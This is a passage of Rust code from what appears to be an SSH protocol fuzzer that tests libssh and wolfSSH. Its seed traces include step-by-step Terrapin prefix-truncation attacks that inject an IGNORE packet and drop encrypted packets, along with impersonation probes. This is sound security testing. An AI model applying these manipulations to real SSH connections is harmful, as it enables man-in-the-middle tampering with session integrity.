            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

/// Differential-fuzzing decryption recipes for a libssh **server** agent.
///
/// After NewKeys the server's responses are opaque `OnWire` ciphertext, so to
/// compare two PUTs structurally we reconstruct the server→client (s2c) key
/// from the server's observed KEX output (exactly as `seed_client_attacker_full`
/// derives the c2s key, but for the 'D' direction) and decrypt each encrypted
/// server output back into a typed `SshMessage`.
///
/// The s2c sequence number after NewKeys depends on whether the server enabled
/// strict KEX (Terrapin mitigation): strict resets the counter to 0, otherwise
/// it continues (KexInit=0, KexEcdhReply=1, NewKeys=2 → first encrypted = 3).
/// We therefore emit a recipe at BOTH the strict (0,1,2) and non-strict (3,4,5)
/// sequence numbers for each of the first three encrypted outputs; the wrong
/// seqno fails the Poly1305 tag and is skipped during evaluation, so each PUT's
/// decrypted store fills in message order and the two stores stay aligned.
pub fn server_decryption_recipes(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    // Reconstruct the exchange hash from the server's KEX output (mirrors
    // seed_client_attacker_full).
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };
    let key = term! { fn_derive_enc_key_s2c((@shared), (@exch_hash), (@exch_hash)) };

    // Decrypt each of the first three encrypted server outputs at both the
    // strict (0,1,2) and non-strict (3,4,5) s2c sequence numbers. The wrong
    // seqno fails the Poly1305 tag during evaluation and is skipped, so both
    // PUTs' decrypted stores fill in message order and stay aligned.
    let mk = |idx_term: Term<SshProtocolTypes>, seqno: Term<SshProtocolTypes>| {
        let key = key.clone();
        term! { fn_decrypt_packet((@idx_term), (@key), (@seqno)) }
    };

    vec![
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_0 }),
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_3 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_1 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_4 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_2 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_5 }),
    ]
}

/// Two-honest-party handshake: both the client and the server are real PUTs,
/// and the Dolev-Yao attacker sits on the wire, here simply relaying each
/// party's output flight to the other faithfully (the benign baseline). This is
/// the trace shape required for the *matching-conversation* property — a
/// security property that is only definable with two honest endpoints to
/// compare. Mutations of this seed (drop / insert / reorder relayed messages)
/// are what a transcript-integrity attack like Terrapin would exercise.
pub fn seed_handshake_two_party(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
        ],
        steps: vec![
            // Bootstrap: both peers emit their banner + KEXINIT without waiting.
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Relay, letting each delivery drive the receiver's next output.
            InputAction::new_step(server, term! { (client, 0)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 0)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 1)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 1)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 2)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 3)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 4)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 4)/RawSshMessageFlight }),
        ],
        ..Default::default()
    }
}

/// Hybrid Terrapin attempt: relay the handshake at **flight** granularity
/// (preserving each PUT's I/O batching, so it completes) but at the targeted
/// c2s point (a) insert a cleartext `SSH_MSG_IGNORE` before the client's NEWKEYS
/// — bumping the server's c2s sequence number by one — and (b) forward the
/// client's post-NEWKEYS encrypted packets individually as `OnWireData`,
/// **dropping the first one**. The inserted IGNORE and the dropped packet cancel
/// in the sequence counter, so the server's AEAD tags still verify (Terrapin
/// prefix truncation). If the dropped packet is ignorable (e.g. EXT_INFO) both
/// peers still complete, but the server never saw it — and the trace-aware
/// matching-conversation oracle flags the divergence. On strict-kex (0.11.4) the
/// server must abort on the IGNORE during KEX, so it never completes.
pub fn seed_terrapin_attempt(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Cleartext handshake, flight-forwarded (batching preserved).
            InputAction::new_step(server, term! { (client, 0)/RawSshMessageFlight }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 1)/RawSshMessageFlight }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/RawSshMessageFlight }), // ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessageFlight }), /* ECDH_REPLY+NEWKEYS */
            // (a) INSERT a cleartext IGNORE into c2s before the client's NEWKEYS:
            // bumps the server's c2s receive sequence number by 1.
            InputAction::new_step(
                server,
                term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) },
            ),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessageFlight }), /* client NEWKEYS */
            InputAction::new_step(client, term! { (server, 3)/RawSshMessageFlight }),
            // (b) Forward the client's encrypted c2s packets individually, DROPPING
            // the first (OnWire 0). With the +1 from the IGNORE, the server's
            // counter realigns on OnWire 1, so tags still verify.
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            InputAction::new_step(client, term! { (server, 4)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/OnWireData }),
            InputAction::new_step(client, term! { (server, 5)/RawSshMessageFlight }),
        ],
        ..Default::default()
    }
}

/// Packet-granular two-honest-party relay: forwards **one message per step**
/// (cleartext as `RawSshMessage`, encrypted as byte-faithful `OnWireData`)
/// instead of whole flights. This makes every packet — including each
/// post-NEWKEYS encrypted packet — an individually droppable/reorderable step,
/// the representation a prefix-truncation attack (Terrapin) needs (the
/// flight-granular relay could only drop whole flights).
///
/// STATUS: WIP. The cleartext handshake and the first encrypted exchange
/// (SERVICE_REQUEST / SERVICE_ACCEPT) relay correctly packet-by-packet, proving
/// individual encrypted packets are forwardable. But the handshake does NOT
/// complete: forcing one-message-per-step desynchronises libssh's reactive
/// output *batching* (the real client stops emitting USERAUTH_REQUEST after
/// SERVICE_ACCEPT, regardless of progress pumping), whereas the flight-granular
/// relay completes precisely because it preserves that batching. Finding: even
/// with packet-granularity, driving two real PUTs to completion one packet at a
/// time fights the libraries' I/O batching — which further explains why the
/// fuzzer is unlikely to *maintain* a completing handshake while mutating toward
/// Terrapin. Not in the corpus until it completes.
pub fn seed_handshake_two_party_packet(
    client: AgentName,
    server: AgentName,
) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Cleartext handshake, one packet per step.
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // KEX_ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // KEX_ECDH_REPLY
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), // server NEWKEYS
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), // client NEWKEYS
            // Encrypted phase: forward each post-NEWKEYS packet as raw OnWireData
            // (byte-faithful; RawSshMessage can't represent ciphertext). OnWireData
            // is indexed per encrypted packet (0-based), and each is an
            // individually droppable step — the representation Terrapin needs.
            // Empty output reads don't add knowledge, so pump liberally.
            OutputAction::new_step(client),
            OutputAction::new_step(client), // SERVICE_REQUEST (client OnWire 0)
            InputAction::new_step(server, term! { (client, 0)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // SERVICE_ACCEPT (server OnWire 0)
            InputAction::new_step(client, term! { (server, 0)/OnWireData }),
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            OutputAction::new_step(client), // USERAUTH_REQUEST (client OnWire 1)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // USERAUTH_SUCCESS (server OnWire 1)
            InputAction::new_step(client, term! { (server, 1)/OnWireData }),
            OutputAction::new_step(client),
        ],
        ..Default::default()
    }
}

/// Packet-granular Terrapin attempt (c2s prefix truncation). Relays the
/// cleartext handshake one packet per step, inserts a cleartext IGNORE to the
/// server just before the client's NEWKEYS (bumping the server's c2s receive
/// sequence number by 1), then in the encrypted phase DROPS the client's first
/// post-NewKeys packet (OnWire 0, send-seqno 3) and forwards the second (OnWire
/// 1, send-seqno 4) to the server, which after the +1 IGNORE is now at receive
/// seqno 4 — so AEAD tags would realign and the truncation be invisible.
///
/// EMPIRICAL FINDING (libssh 0.10.4): this c2s direction does NOT work — the
/// client emits only a SINGLE post-NewKeys packet (SERVICE_REQUEST) and then
/// waits for the server's reply, so there is no second packet (OnWire 1) to
/// realign onto, and no *ignorable* first packet to drop (SERVICE_REQUEST is
/// mandatory — dropping it stalls auth). A tag-preserving Terrapin truncation
/// therefore needs the S2C direction, where the server sends an EXT_INFO
/// (ignorable) as its first post-NewKeys packet: drop that, forward the next,
/// realign on the client side. That requires ext-info to be negotiated and a
/// s2c packet-granular relay — the remaining work to make the
/// matching-conversation oracle fire on a completed Terrapin. On strict-kex
/// (0.11.4) the injected IGNORE is rejected during KEX, mitigating regardless.
pub fn seed_terrapin_packet(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // ECDH_REPLY
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), // server NEWKEYS
            // (a) insert IGNORE to server before client NEWKEYS (+1 server c2s seqno)
            InputAction::new_step(
                server,
                term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) },
            ),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), // client NEWKEYS
            // pump the client to emit its post-NewKeys encrypted packets
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            // (b) DROP client OnWire 0 (seqno 3); forward OnWire 1 (seqno 4)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server),
        ],
        ..Default::default()
    }
}

/// S2C Terrapin prefix truncation (the direction the c2s attempt showed is
/// needed). Packet-granular relay; insert a cleartext IGNORE to the **client**
/// just before the server's NEWKEYS (+1 the client's s2c receive seqno), then in
/// the encrypted phase DROP the server's first post-NewKeys packet — its
/// EXT_INFO, which is ignorable — and forward every later server packet shifted
/// by one (its send-seqno now matches the client's +1 receive seqno, so AEAD
/// tags realign). The client completes auth never having seen EXT_INFO, so the
/// server's sent transcript and the client's received transcript diverge → the
/// matching-conversation oracle fires. On strict-kex (0.11.4) the IGNORE is
/// rejected during KEX, mitigating. (Relies on the real libssh peers negotiating
/// ext-info, which recent libssh does by default.)
pub fn seed_terrapin_s2c(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner c->s
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner s->c
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT c->s
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT s->c
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // ECDH_INIT c->s
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // ECDH_REPLY s->c
            // (a) insert IGNORE to the CLIENT before the server's NEWKEYS (+1 client s2c seqno)
            InputAction::new_step(
                client,
                term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) },
            ),
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), /* server NEWKEYS s->c */
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), /* client NEWKEYS c->s */
            // Encrypted phase. Forward client's c2s packets normally; on s2c DROP
            // the server's OnWire 0 (EXT_INFO, seqno 3) and forward OnWire 1.. only.
            OutputAction::new_step(server), // pump server to emit EXT_INFO (OnWire 0, dropped)
            OutputAction::new_step(server),
            OutputAction::new_step(client),
            OutputAction::new_step(client), // client SERVICE_REQUEST (OnWire 0)
            InputAction::new_step(server, term! { (client, 0)/OnWireData }), // -> server
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server SERVICE_ACCEPT (OnWire 1, seqno 4)
            InputAction::new_step(client, term! { (server, 1)/OnWireData }), /* forward (drop
                                             * OnWire 0) */
            OutputAction::new_step(client),
            OutputAction::new_step(client), // client USERAUTH_REQUEST (OnWire 1)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }), // -> server
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server USERAUTH_SUCCESS (OnWire 2)
            InputAction::new_step(client, term! { (server, 2)/OnWireData }), // forward realigned
            OutputAction::new_step(client),
        ],
        ..Default::default()
    }
}

/// HONEST completing packet-granular two-party relay — the Terrapin discovery
/// substrate. Identical in shape to `seed_terrapin_s2c` but faithful: NO injected
/// IGNORE, and the server's EXT_INFO (s2c OnWire 0) is forwarded in order with
/// the rest. Both peers complete and transcripts agree (no violation). From here
/// the Terrapin attack is exactly TWO mutations away: (1) Skip the
/// `(server,0)/OnWireData` forward step (drop EXT_INFO), and (2) insert a cleartext
/// IGNORE to the client before the server's NEWKEYS. The +1 from the IGNORE
/// cancels the −1 from the skip, so the already-present `(server,1)`/`(server,2)`
/// forwards realign and tags stay valid — letting the matching-conversation oracle
/// fire. This seed exists so the fuzzer has a packet-granular base whose mutation
/// neighbourhood actually contains Terrapin.
pub fn seed_handshake_two_party_packet_complete(
    client: AgentName,
    server: AgentName,
) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                    ..Default::default()
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner c->s
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner s->c
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT c->s
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT s->c
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // ECDH_INIT c->s
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // ECDH_REPLY s->c
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), /* server NEWKEYS s->c */
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), /* client NEWKEYS c->s */
            // Encrypted phase, faithful: forward server OnWire 0 (EXT_INFO), 1, 2.
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server EXT_INFO (OnWire 0)
            InputAction::new_step(client, term! { (server, 0)/OnWireData }), // forward EXT_INFO
            OutputAction::new_step(client),
            OutputAction::new_step(client), // client SERVICE_REQUEST (OnWire 0)
            InputAction::new_step(server, term! { (client, 0)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server SERVICE_ACCEPT (OnWire 1)
            InputAction::new_step(client, term! { (server, 1)/OnWireData }),
            OutputAction::new_step(client),
            OutputAction::new_step(client), // client USERAUTH_REQUEST (OnWire 1)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server USERAUTH_SUCCESS (OnWire 2)
            InputAction::new_step(client, term! { (server, 2)/OnWireData }),
            OutputAction::new_step(client),
        ],
        ..Default::default()
    }
}

/// AES-256-GCM counterpart of [`server_decryption_recipes`], for the AES-GCM
/// flow (mirrors `seed_client_attacker_full_aesgcm`). Decrypts the server's
/// first three post-NewKeys s2c packets. The GCM invocation counter restarts at
/// 0 at NewKeys, so it matches the per-direction packet index directly (no
/// strict/non-strict ambiguity as in the ChaCha20 case).
pub fn server_decryption_recipes_aesgcm(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // The client KexInit is the fixed AES-GCM offer, so I_C is reconstructible
    // without consulting any PUT knowledge.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@exch_hash)) };

    let mk = |idx_term: Term<SshProtocolTypes>, counter: Term<SshProtocolTypes>| {
        let key = key.clone();
        let iv = iv.clone();
        // Flight decryption: peel EVERY BPP packet in this socket-write blob,
        // decrypting each with a consecutive GCM counter starting at `counter`.
        // This makes capture independent of how the peer batched packets into
        // writes (libssh vs wolfSSH batch differently), so both PUTs' full s2c
        // message sequences are recovered and semantic alignment compares
        // like-with-like — no more spurious presence diffs from batched packets.
        term! { fn_decrypt_flight_aesgcm((@idx_term), (@key), (@iv), (@counter)) }
    };

    // For each observed server socket-write (OnWireData) we try each possible
    // starting s2c sequence number (which resets to 0 at NewKeys); only the true
    // one passes the first packet's GCM tag, and the flight decryption then peels
    // the rest of that write. Missing outputs / wrong counters fail and skip.
    let counters = [
        term! { fn_u32_0 },
        term! { fn_u32_1 },
        term! { fn_u32_2 },
        term! { fn_u32_3 },
        term! { fn_u32_4 },
        term! { fn_u32_5 },
        term! { fn_u32_6 },
        term! { fn_u32_7 },
    ];
    let outputs = [
        term! { (server, 0)[None]/RawSshMessageFlight },
        term! { (server, 1)[None]/RawSshMessageFlight },
        term! { (server, 2)[None]/RawSshMessageFlight },
        term! { (server, 3)[None]/RawSshMessageFlight },
        term! { (server, 4)[None]/RawSshMessageFlight },
        term! { (server, 5)[None]/RawSshMessageFlight },
        term! { (server, 6)[None]/RawSshMessageFlight },
        term! { (server, 7)[None]/RawSshMessageFlight },
    ];
    let mut recipes = Vec::with_capacity(counters.len() * outputs.len() + 1);

    // ROBUST full-stream decryption: merge the first 8 drains into one flight and
    // peel every encrypted packet from counter 0 in a single pass. Puffin forces
    // a drain after each input step, so drains 0..7 exist for both PUTs on every
    // differential-corpus seed; the s2c counter resets to 0 at NewKeys and the
    // pre-NewKeys packets are unencrypted (skipped by the flight decryptor), so
    // the concatenated OnWire stream starts at counter 0. This recovers the FULL
    // post-NewKeys s2c message sequence regardless of how the peer batched it
    // across drains — closing the under-decode gap where a per-drain, fixed-
    // counter recipe could miss a packet (e.g. a rekey KEXINIT) and manufacture a
    // spurious `() vs <msg>` presence divergence.
    let all_drains = term! {
        fn_concat_raw_flights(
            (fn_concat_raw_flights(
                (fn_concat_raw_flights(
                    (fn_concat_raw_flights(
                        (fn_concat_raw_flights(
                            (fn_concat_raw_flights(
                                (fn_concat_raw_flights(
                                    ((server, 0)[None]/RawSshMessageFlight),
                                    ((server, 1)[None]/RawSshMessageFlight)
                                )),
                                ((server, 2)[None]/RawSshMessageFlight)
                            )),
                            ((server, 3)[None]/RawSshMessageFlight)
                        )),
                        ((server, 4)[None]/RawSshMessageFlight)
                    )),
                    ((server, 5)[None]/RawSshMessageFlight)
                )),
                ((server, 6)[None]/RawSshMessageFlight)
            )),
            ((server, 7)[None]/RawSshMessageFlight)
        )
    };
    recipes.push(term! { fn_decrypt_flight_aesgcm((@all_drains), (@key), (@iv), (fn_u32_0)) });

    for counter in &counters {
        for output in &outputs {
            recipes.push(mk(output.clone(), counter.clone()));
        }
    }
    recipes
}

pub fn create_corpus(
    _put: &dyn puffin::put_registry::Factory<SshProtocolBehavior>,
) -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
    let client = AgentName::first();
    let server = client.next();

    // Only seeds that complete a full handshake are kept (the legacy mutual /
    // pre-crypto stub seeds were pruned). The chacha20 *_full seeds complete on
    // libssh; the *_aesgcm seeds complete on BOTH libssh and wolfSSH.
    //
    // On this branch the cross-vendor differential corpus is restricted to the
    // seeds that complete IDENTICALLY on both libssh and wolfSSH (the AES-GCM
    // client seeds). The other seeds do not (chacha20/ctr are libssh-only;
    // server-attacker / channel / rekey / ext-info / two-party seeds diverge
    // cross-vendor), so they would become spurious objectives and starve the
    // differential corpus — they are commented out below but kept documented
    // (and their `seed_*` functions remain defined above) for single-PUT /
    // claims-oracle campaigns.
    //
    // The `rich-corpus` feature appends the divergent seeds (channel DATA, rekey,
    // ext-info, credential-confusion B/C) for single-PUT parser/crash campaigns;
    // see the cfg block after this vec.
    #[allow(unused_mut)]
    let mut corpus: Vec<(Trace<SshProtocolTypes>, &'static str)> = vec![
        // (
        //     seed_client_attacker_full(server),
        //     "seed_client_attacker_full",
        // ),
        // (
        //     seed_server_attacker_full(client),
        //     "seed_server_attacker_full",
        // ),
        (
            seed_client_attacker_full_aesgcm(server),
            "seed_client_attacker_full_aesgcm",
        ),
        // Same handshake but with a synthesized KEXINIT whose algorithm lists are
        // mutable sub-terms — the entry point for negotiation / downgrade fuzzing.
        (
            seed_client_attacker_full_kexinit_synth(server),
            "seed_client_attacker_full_kexinit_synth",
        ),
        // Non-AEAD suite (aes256-ctr + hmac-sha2-256): drives the separate
        // cipher + separate-MAC code path, distinct from the AEAD seeds.
        // (
        //     seed_client_attacker_full_ctr(server),
        //     "seed_client_attacker_full_ctr",
        // ),
        // (
        //     seed_server_attacker_full_aesgcm(client),
        //     "seed_server_attacker_full_aesgcm",
        // ),
        // Publickey login as key A — the baseline for the entity-authentication
        // / impersonation oracle. Mutations that make the server authenticate a
        // different key are flagged as impersonation. The chacha20 variant is
        // libssh-only; the aesgcm variant completes on both libssh and wolfSSH.
        // (
        //     seed_client_attacker_pubkey(server),
        //     "seed_client_attacker_pubkey",
        // ),
        (
            seed_client_attacker_pubkey_aesgcm(server),
            "seed_client_attacker_pubkey_aesgcm",
        ),
        // Credential-confusion entry point, PROMOTED to the differential corpus.
        // Publickey login as authorized identity B (user "userb", key B): both
        // stacks emit USERAUTH_SUCCESS and the trace is 0-diff. From here the DY
        // mutator explores the credential space under differential comparison —
        // swapping the username / pubkey blob / signature across identities A/B/C
        // — so a mutation that makes one stack AUTHENTICATE a pairing the other
        // rejects surfaces as a real accept/reject (UserAuthSuccess vs Failure)
        // divergence. The explicit *rejection* seeds (impersonate / unauthorized
        // C) stay single-PUT only: both stacks correctly reject, but they flush
        // USERAUTH_FAILURE at different s2c counter positions, so the decryption
        // recipe aligns on one side only — the same flush-timing wall documented
        // for the channel-number query. Not a bug; just not positionally clean.
        (
            seed_client_attacker_pubkey_b(server),
            "seed_client_attacker_pubkey_b",
        ),
        // Session layer: authenticated channel with full connection-protocol
        // traffic (window-adjust / data / extended-data / eof / close). Not
        // promoted here — kept single-PUT (rich-corpus) pending the wolfSSH
        // WS_CHAN_RXD harness handling that zeros its execution-status divergence.
        // (
        //     seed_client_attacker_channel_data(server),
        //     "seed_client_attacker_channel_data",
        // ),
        // Client-initiated rekey (RFC 4253 §9), mutable rekey KEXINIT. PROMOTED:
        // 0-diff cross-vendor now that uniformise + semantic alignment + flight
        // decryption are in place (the earlier "diverges" note was stale).
        (
            seed_client_attacker_rekey(server),
            "seed_client_attacker_rekey",
        ),
        // RFC 8308 ext-info parser. PROMOTED: 0-diff cross-vendor.
        (
            seed_client_attacker_ext_info(server),
            "seed_client_attacker_ext_info",
        ),
        // Two real PUTs relayed by the attacker — the substrate the live
        // matching-conversation oracle needs. Mutations that desync the relayed
        // transcript (Terrapin-style) are flagged as a security objective.
        // (
        //     seed_handshake_two_party(client, server),
        //     "seed_handshake_two_party",
        // ),
        // Packet-granular honest relay: the substrate whose 2-mutation
        // neighbourhood (skip EXT_INFO forward + insert IGNORE) contains Terrapin.
        // (
        //     seed_handshake_two_party_packet_complete(client, server),
        //     "seed_handshake_two_party_packet_complete",
        // ),
    ];

    // Richer, cross-vendor-DIVERGING seeds for single-PUT parser/crash campaigns.
    // Kept out of the differential corpus (they don't complete identically on both
    // stacks) but invaluable for exercising post-auth channel data, re-KEX, ext-
    // info, and the credential-confusion boundary on one stack at a time.
    #[cfg(feature = "rich-corpus")]
    {
        let _ = client; // (reserved for future server-attacker rich seeds)
        corpus.extend([
            // Post-auth channel DATA / flow-control / teardown, mutable payload.
            // (rekey and ext_info were promoted to the differential corpus.)
            (
                seed_client_attacker_channel_data(server),
                "seed_client_attacker_channel_data",
            ),
            // Credential-confusion REJECTION seeds (impersonation A-name-with-key-B,
            // and unauthorized key C). Both stacks correctly reject; single-PUT
            // only because they flush USERAUTH_FAILURE at different s2c positions
            // (flush-timing wall). The authorized-B baseline is promoted to the
            // differential corpus above (seed_client_attacker_pubkey_b).
            (
                seed_client_attacker_impersonate_a_with_b(server),
                "seed_client_attacker_impersonate_a_with_b",
            ),
            (
                seed_client_attacker_unauthorized_key_c(server),
                "seed_client_attacker_unauthorized_key_c",
            ),
            // Peer-initiated-rekey conformance probe: inject a valid KEXINIT after
